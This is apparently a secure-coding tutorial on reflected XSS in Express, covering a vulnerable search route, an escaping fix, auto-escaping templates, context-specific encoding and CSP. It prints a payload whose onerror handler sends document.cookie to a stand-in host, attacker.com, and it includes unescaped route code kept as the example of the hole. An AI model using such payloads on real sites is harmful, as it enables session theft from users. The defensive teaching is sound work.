# Understanding Reflected XSS: A Practical Deep Dive

I'll show you a real vulnerability pattern, explain the mechanics, and how to fix it.

## The Vulnerable Code

Here's a typical Node.js/Express example:

```javascript
// VULNERABLE - DO NOT USE
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`
    <html>
      <body>
        <h1>Search Results for: ${query}</h1>
        <p>You searched for "${query}"</p>
      </body>
    </html>
  `);
});
```

## A Real Payload

```
/search?q=<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

When a user visits this link, the server responds with:

```html
<html>
  <body>
    <h1>Search Results for: <img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)"></h1>
    <p>You searched for "<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)"</p>
  </body>
</html>
```

## Why It Works

1. **No validation**: The server accepts any input
2. **No encoding**: The input is inserted directly into HTML
3. **Browser execution**: The browser parses `<img>` as an HTML tag, not text
4. **Event handler**: `onerror` fires when the image fails to load (which it will, since `src=x` is invalid)
5. **JavaScript execution**: The attacker's code runs in the victim's browser with their privileges

The attacker tricks a user into clicking a malicious link (via email, social media, etc.). The victim's browser executes the payload, stealing cookies or session tokens.

## The Fix: Output Encoding

```javascript
// SAFE - Encode HTML entities
const escapeHtml = (text) => {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
};

app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`
    <html>
      <body>
        <h1>Search Results for: ${escapeHtml(query)}</h1>
        <p>You searched for "${escapeHtml(query)}"</p>
      </body>
    </html>
  `);
});
```

Now the same payload becomes harmless text:

```html
<h1>Search Results for: &lt;img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)"&gt;</h1>
```

The browser displays it as literal text, not executable code.

## Better: Use a Template Engine

Most modern frameworks handle this automatically:

```javascript
// Express with EJS (escapes by default)
app.get('/search', (req, res) => {
  res.render('search', { query: req.query.q });
});
```

```ejs
<!-- search.ejs -->
<h1>Search Results for: <%= query %></h1>
```

The `<%= %>` syntax automatically HTML-encodes the variable.

## Context Matters

Encoding rules differ by context. This is critical:

```javascript
// HTML context - use HTML encoding
<p><%= userInput %></p>

// JavaScript context - use JavaScript encoding
<script>
  var name = "<%= jsEscape(userInput) %>";
</script>

// URL context - use URL encoding
<a href="https://example.com?param=<%= urlEncode(userInput) %>">

// CSS context - use CSS encoding
<style>
  body { background: url("<%= cssEscape(userInput) %>"); }
</style>
```

## Defense Checklist

- ✅ **Encode output** based on context (HTML, JS, URL, CSS)
- ✅ **Use templating engines** that auto-escape
- ✅ **Content Security Policy (CSP)** headers to restrict script execution
- ✅ **HTTPOnly cookies** so JavaScript can't access session tokens
- ✅ **Input validation** (whitelist, not blacklist)
- ✅ **Never trust user input**, even from "safe" sources

## CSP Header Example

```javascript
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'"
  );
  next();
});
```

This prevents inline scripts from executing, blocking most XSS payloads even if encoding fails.

---

**Key insight**: XSS works because browsers can't distinguish between code the developer intended and code the attacker injected. Your job is to ensure user input is treated as *data*, never as *code*.

